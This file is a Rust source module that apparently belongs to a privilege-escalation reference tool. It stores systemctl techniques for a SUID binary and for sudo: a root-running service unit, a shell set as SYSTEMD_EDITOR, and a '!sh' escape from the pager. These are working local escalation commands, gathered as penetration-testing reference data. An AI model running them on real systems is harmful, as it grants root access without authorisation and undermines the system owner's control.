pub static BIN_NAME: &'static str = "systemctl";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which systemctl) .

    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    ./systemctl link $TF
    ./systemctl enable --now $TF
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    TF=$(mktemp)
    echo /bin/sh >$TF
    chmod +x $TF
    sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
"#;
pub static SUDO_CODE_2: &'static str = r#"
    
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    sudo systemctl link $TF
    sudo systemctl enable --now $TF
"#;
pub static SUDO_DESC_3: &'static str =
    "This invokes the default pager, which is likely to be `less`, other functions may apply.";
pub static SUDO_CODE_3: &'static str = r#"
    
    sudo systemctl
    !sh
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
